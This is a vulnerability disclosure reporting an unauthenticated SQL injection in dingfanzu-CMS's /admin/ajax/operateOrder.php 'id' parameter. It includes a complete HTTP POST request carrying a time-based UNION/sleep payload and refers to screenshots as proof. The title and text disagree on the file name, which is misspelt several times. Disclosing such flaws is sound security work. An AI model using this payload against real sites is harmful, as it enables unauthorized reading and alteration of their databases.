
# dingfanzu-CMS operateOrder.php shopId SQL-inject

**Exploit Title: dingfanzu-CMS checkOrder.php shopId SQL inject**

**Exploit Author: https://github.com/xiaosguang/cve/blob/main/dingfanzu**

**Vendor Homepage: https://github.com/geeeeeeeek/dingfanzu**

**Software Link: https://github.com/geeeeeeeek/dingfanzu**

**CMSName: dingfanzu-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

SQL injection refers to attackers tampering with primitive sentence logic by inputting malicious SQL code. Dingfanzu - CMS's operteOrder.chp does not strictly filter user input and concatenates it into SQL statements. Attackers can construct special inputs, alter the execution results of statements, and achieve illegal data access, modification, and even control of databases..

The path to the vulnerability：/admin/ajax/operateOrder.php
The param to the vulnerability：type=cancel&id=
    Payload used:

```
POST /admin/ajax/operateOrder.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: http://127.0.0.1/dingfanzu-master/dingfanzu-master/admin/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=4
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

type=cancel&id=1+union+select+sleep(3)--+

```


## Proof of Concept

The parameter 'id' received from the user input is not strictly validated in the operatiteOrder.chp file, and the file can be accessed without authorization for SQL injection attacks.


![image-20250106015104794](https://github.com/user-attachments/assets/2780414f-c453-4396-b332-3b054080ccb6)



Practical verification

![image-20250106021003686](https://github.com/user-attachments/assets/656d9fab-e036-4d83-9bf0-06a19b94a48c)
